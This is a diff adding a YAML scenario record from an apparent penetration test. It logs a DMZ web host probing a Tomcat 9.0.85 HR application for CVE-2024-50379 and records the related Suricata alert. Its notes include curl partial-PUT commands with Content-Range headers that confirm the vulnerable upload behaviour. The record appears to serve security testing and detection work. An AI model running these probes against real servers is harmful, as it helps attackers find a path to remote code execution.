@@ -1,0 +1,36 @@
+# Web (DMZ, 10.10.10.12) -> HR-App (APP, 10.10.20.23:8080, Tomcat 9.0.85).
+# CVE-2024-50379 (CVSS 9.8 CRITICAL): Partial PUT via Content-Range creates a temporary
+# file on the server. In Tomcat 9.0.0.M1-9.0.97 (fix=9.0.98), the DefaultServlet with
+# readonly=false accepts Content-Range PUT requests and stores an incomplete .tmp file
+# that can be executed (TOCTOU race with JSP compilation). Confirmed: HTTP 201 on both
+# the full PUT and the Content-Range partial PUT, HTTP 204 on the second chunk.
+# Suricata 86601 (ET HUNTING curl User-Agent cross-zone APP). DMZ->APP cross-zone.
+# Evidence: evaluation/pentest/evidence/s30_tomcat_partialput.txt
+id: S30-web-to-hrapp-tomcat-partialput
+description: Tomcat 9.0.85 partial PUT via Content-Range accepted (CVE-2024-50379 TOCTOU attack surface); web->hr-app, DMZ->APP.
+start: 2026-11-16T20:01:59Z
+end: 2026-11-16T20:02:05Z
+attacker: web
+steps:
+  - step: 1
+    start: 2026-11-16T20:01:59Z
+    end: 2026-11-16T20:02:05Z
+    target: HR-App
+    cve: CVE-2024-50379
+    technique: T1190
+    outcome: success
+    achieved: data_access
+    pivot: false
+    notes: |
+      curl -X PUT http://10.10.20.23:8080/hr/cve50379_test.txt -H "Content-Type: text/plain"
+        -> HTTP 201 Created (DefaultServlet readonly=false confirmed)
+      curl -X PUT http://10.10.20.23:8080/hr/cve50379_partial.txt \
+        -H "Content-Range: bytes 0-11/50" --data-binary "PARTIAL_DATA"
+        -> HTTP 201 Created (partial file created on server)
+      curl -X PUT http://10.10.20.23:8080/hr/cve50379_partial.txt \
+        -H "Content-Range: bytes 12-30/50" --data-binary "_MORE_DATA_12_30"
+        -> HTTP 204 No Content (chunk appended)
+      Tomcat 9.0.85 <= 9.0.97 (fix is 9.0.98+): Content-Range partial PUT accepted.
+      TOCTOU surface: .tmp file created between partial writes can be executed as JSP.
+      CVE-2024-50379: same DefaultServlet readonly=false root cause as CVE-2025-24813 (S15).
+      evidence s30_tomcat_partialput.txt
